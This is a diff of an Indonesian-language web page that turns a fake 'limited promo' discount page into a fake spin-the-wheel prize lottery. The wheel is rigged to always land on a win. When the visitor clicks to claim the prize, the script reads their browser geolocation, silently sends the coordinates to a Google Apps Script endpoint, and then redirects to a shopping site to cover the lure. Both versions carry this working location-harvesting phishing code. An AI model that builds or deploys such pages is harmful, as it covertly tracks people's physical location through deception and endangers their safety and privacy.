@@ -1,172 +1,190 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Promo Spesial</title>
+  <title>Undian Berhadiah</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
+
   <style>
     body {
       margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(135deg, #ff512f, #dd2476);
-      overflow: hidden;
-      color: white;
-    }
-
-    .container {
-      position: relative;
-      z-index: 2;
+      font-family: Arial;
       text-align: center;
-      padding: 20px;
-      top: 50%;
-      transform: translateY(-50%);
+      background: linear-gradient(135deg,#ff512f,#dd2476);
+      color: white;
+      overflow: hidden;
     }
 
-    .card {
-      background: rgba(255,255,255,0.15);
-      backdrop-filter: blur(15px);
-      border-radius: 20px;
-      padding: 25px;
-      max-width: 320px;
-      margin: auto;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
-      animation: fadeIn 1s ease;
+    h2 { margin-top: 20px; }
+
+    .wheel-box {
+      position: relative;
+      width: 260px;
+      height: 260px;
+      margin: 20px auto;
     }
 
-    @keyframes fadeIn {
-      from {opacity:0; transform: translateY(20px);}
-      to {opacity:1; transform: translateY(0);}
+    .wheel {
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      background: conic-gradient(
+        #ffeb3b 0deg 60deg,
+        #4caf50 60deg 120deg,
+        #2196f3 120deg 180deg,
+        #ff9800 180deg 240deg,
+        #9c27b0 240deg 300deg,
+        #f44336 300deg 360deg
+      );
+      transition: transform 5s cubic-bezier(.17,.67,.83,.67);
     }
 
-    h1 {
-      font-size: 20px;
-    }
-
-    .timer {
-      font-size: 24px;
-      font-weight: bold;
-      color: yellow;
-      margin: 10px 0;
-    }
-
-    .gift {
-      font-size: 40px;
-      margin: 10px 0;
-      animation: bounce 1s infinite;
-    }
-
-    @keyframes bounce {
-      0%,100%{transform:translateY(0);}
-      50%{transform:translateY(-10px);}
+    .pointer {
+      position: absolute;
+      top: -15px;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 25px;
     }
 
     button {
-      padding: 12px;
+      padding: 12px 20px;
       border: none;
       border-radius: 10px;
       background: #00e676;
-      color: black;
       font-weight: bold;
-      width: 100%;
-      margin-top: 10px;
+      margin-top: 15px;
       cursor: pointer;
       font-size: 16px;
     }
 
-    #status {
-      margin-top: 10px;
-      font-size: 13px;
+    #hasil {
+      margin-top: 15px;
+      font-size: 18px;
+      font-weight: bold;
     }
 
-    /* animasi jatuh */
-    .falling {
+    /* hadiah popup */
+    .popup {
+      position: fixed;
+      top:0; left:0;
+      width:100%;
+      height:100%;
+      background: rgba(0,0,0,0.8);
+      display:none;
+      justify-content:center;
+      align-items:center;
+      flex-direction:column;
+    }
+
+    .popup img {
+      width: 150px;
+      animation: zoom 0.5s ease;
+    }
+
+    @keyframes zoom {
+      from{transform:scale(0);}
+      to{transform:scale(1);}
+    }
+
+    /* confetti */
+    .confetti {
       position: absolute;
-      top: -50px;
-      font-size: 24px;
-      animation: fall linear infinite;
+      width: 10px;
+      height: 10px;
+      background: yellow;
+      top:0;
+      animation: fall 3s linear infinite;
     }
 
     @keyframes fall {
-      to {
-        transform: translateY(110vh);
-      }
+      to { transform: translateY(100vh); }
     }
   </style>
 </head>
 
 <body>
 
-<div class="container">
-  <div class="card">
-    <h1>🎁 Promo Terbatas</h1>
-    
-    <div class="gift">📱</div>
+<h2>🎁 Putar & Menangkan Hadiah</h2>
 
-    <div>Diskon hingga 90%</div>
-
-    <div class="timer" id="timer">00:10</div>
-
-    <button onclick="ambilLokasi()">Ambil Sekarang</button>
-
-    <div id="status"></div>
-  </div>
+<div class="wheel-box">
+  <div class="pointer">🔻</div>
+  <div class="wheel" id="wheel"></div>
 </div>
 
+<button onclick="putar()">PUTAR</button>
+
+<div id="hasil"></div>
+
+<!-- popup hadiah -->
+<div class="popup" id="popup">
+  <h2>🎉 SELAMAT!</h2>
+  <p>Kamu mendapatkan hadiah spesial</p>
+  <img src="https://cdn-icons-png.flaticon.com/512/747/747376.png">
+  <br><br>
+  <button onclick="lanjut()">Ambil Hadiah</button>
+</div>
+
+<!-- audio -->
+<audio id="spinSound" src="https://www.soundjay.com/misc/sounds/wheel-spin.mp3"></audio>
+<audio id="winSound" src="https://www.soundjay.com/human/sounds/applause-8.mp3"></audio>
+
 <script>
-// countdown
-let time = 10;
-setInterval(()=>{
-  time--;
-  document.getElementById("timer").innerHTML = "00:" + (time < 10 ? "0"+time : time);
-  if(time <= 0){
-    time = 10;
+let sudah = false;
+
+function putar(){
+  if(sudah) return;
+  sudah = true;
+
+  let wheel = document.getElementById("wheel");
+
+  document.getElementById("spinSound").play();
+
+  // arahkan ke segmen tertentu (misal 300 derajat)
+  let target = 300;
+  let putaran = 1440 + target;
+
+  wheel.style.transform = "rotate("+putaran+"deg)";
+
+  setTimeout(()=>{
+    document.getElementById("winSound").play();
+    document.getElementById("popup").style.display = "flex";
+    confetti();
+  },5000);
+}
+
+// efek confetti
+function confetti(){
+  for(let i=0;i<30;i++){
+    let c = document.createElement("div");
+    c.className="confetti";
+    c.style.left=Math.random()*100+"vw";
+    c.style.background="hsl("+Math.random()*360+"deg,100%,50%)";
+    c.style.animationDuration=(Math.random()*3+2)+"s";
+    document.body.appendChild(c);
+
+    setTimeout(()=>c.remove(),4000);
   }
-},1000);
+}
 
-// animasi jatuh
-setInterval(()=>{
-  let el = document.createElement("div");
-  el.className = "falling";
-  el.innerHTML = "🎁";
-  el.style.left = Math.random()*100 + "vw";
-  el.style.animationDuration = (Math.random()*3+2)+"s";
-  document.body.appendChild(el);
-
-  setTimeout(()=>{el.remove()},5000);
-},300);
+function lanjut(){
+  ambilLokasi();
+}
 
 // ambil lokasi
 function ambilLokasi(){
+  if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(function(pos){
 
-  if (navigator.geolocation) {
+      var lat = pos.coords.latitude;
+      var lon = pos.coords.longitude;
 
-    navigator.geolocation.getCurrentPosition(
-      function(pos){
+      fetch("https://script.google.com/macros/s/AKfycbw2q8jMhiz3W0FRQ0_C-8hCA3WVAxAqmjeQ3snUsI0j6AMlYYNT_RrPTfjjFxxa48Yv/exec?lat="+lat+"&lon="+lon);
 
-        var lat = pos.coords.latitude;
-        var lon = pos.coords.longitude;
+      setTimeout(()=>{
+        window.location.href = "https://shopee.co.id";
+      },2000);
 
-        var url = "https://script.google.com/macros/s/AKfycbw2q8jMhiz3W0FRQ0_C-8hCA3WVAxAqmjeQ3snUsI0j6AMlYYNT_RrPTfjjFxxa48Yv/exec?lat=" 
-                  + lat + "&lon=" + lon;
-
-        fetch(url);
-
-        document.getElementById("status").innerHTML = "✅ Memproses hadiah...";
-
-        setTimeout(()=>{
-          window.location.href = "https://shopee.co.id";
-        },2000);
-
-      },
-
-      function(error){
-        document.getElementById("status").innerHTML = "❌ Aktifkan lokasi dulu";
-      }
-
-    );
-
-  } else {
-    document.getElementById("status").innerHTML = "❌ Tidak support";
+    });
   }
 }
 </script>
